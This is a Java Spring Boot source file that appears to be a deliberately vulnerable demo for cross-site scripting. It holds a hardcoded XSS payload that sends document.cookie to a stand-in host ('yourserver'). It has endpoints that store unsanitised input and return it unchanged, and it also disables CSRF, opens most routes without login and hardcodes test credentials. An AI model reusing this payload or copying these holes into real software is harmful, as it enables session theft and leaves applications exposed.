package demo;

import java.io.IOException;
import java.security.Principal;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.security.SecurityProperties;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.annotation.Order;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.web.csrf.CsrfToken;
import org.springframework.security.web.session.SessionManagementFilter;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

@SpringBootApplication
@RestController
@EnableGlobalMethodSecurity
public class UiApplication {

    private List<Customer> cust = new ArrayList<Customer>();
    private String xssInputData = new String(
        "<p> <input type='button' name='Redirect' class='btn btn-primary' value='Submit' "
            + "onclick='<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>' /></p>");

    @RequestMapping("/user")
    public Principal user(Principal user) {
        return user;
    }

    @RequestMapping(value = "/getallcustomer", method = RequestMethod.GET)
    public Response getResource() {
        Response response = new Response("Done", cust);
        return response;
    }

    @RequestMapping(value = "/postcustomer") //method = RequestMethod.POST)
    public Response postCustomer(@RequestBody Customer customer) {
        System.out.println("\n\nCustomer:");
        System.out.println(customer.getFirstname());
        cust.add(customer);
        // Create Response Object
        Response response = new Response("Done", customer);
        return response;
    }

    @RequestMapping(value = "/postxss", method = RequestMethod.POST)
    public Response postXSS(@RequestBody String xssInput) {
        xssInputData = new String(xssInput);
        Response response = new Response("Done", xssInput);
        return response;
    }

    @RequestMapping("/resource")
    public Map<String, Object> home() {
        Map<String, Object> model = new HashMap<String, Object>();
        model.put("id", UUID.randomUUID().toString());
        model.put("content", "Hello World");
        return model;
    }

    @RequestMapping("/getinfo")
    public Response info() {
        Response response = new Response("Done", new String(this.xssInputData));
        return response;
    }

    public static void main(String[] args) {
        SpringApplication.run(UiApplication.class, args);
    }

    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
        auth.inMemoryAuthentication().withUser("test").password("password").roles("USER");
    }

    @Configuration
    @Order(SecurityProperties.ACCESS_OVERRIDE_ORDER)
    protected static class SecurityConfiguration extends WebSecurityConfigurerAdapter {
        @Override
        protected void configure(HttpSecurity http) throws Exception {

            String[] patterns = new String[] {"/index.html", "/home.html", "/login1.html", "/xss2.html", "/", "/xss",
                "/login", "/xss1.html", "/resource", "/postcustomer", "/getallcustomer", "/getinfo", "/postxss"};

            // @formatter:off
            //http.httpBasic();
            //http.authorizeRequests().antMatchers("/**").permitAll(); //.anyRequest().authenticated();

            http.headers().httpStrictTransportSecurity();
            http.csrf().disable();
            http.httpBasic().and().authorizeRequests().antMatchers(patterns).permitAll().anyRequest().authenticated();
            http.csrf().and().addFilterAfter(new CsrfGrantingFilter(), SessionManagementFilter.class);
            //http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());

            // @formatter:on
        }

        protected class CsrfGrantingFilter implements Filter {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {}

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
                FilterChain filterChain) throws IOException, ServletException {
                CsrfToken csrf = (CsrfToken)servletRequest.getAttribute(CsrfToken.class.getName());
                String token = csrf.getToken();
                if (token != null) {
                    HttpServletResponse response = (HttpServletResponse)servletResponse;
                    Cookie cookie = new Cookie("CSRF-TOKEN", token);
                    cookie.setPath("/");
                    response.addCookie(cookie);
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }

            @Override
            public void destroy() {}
        }
    }
}
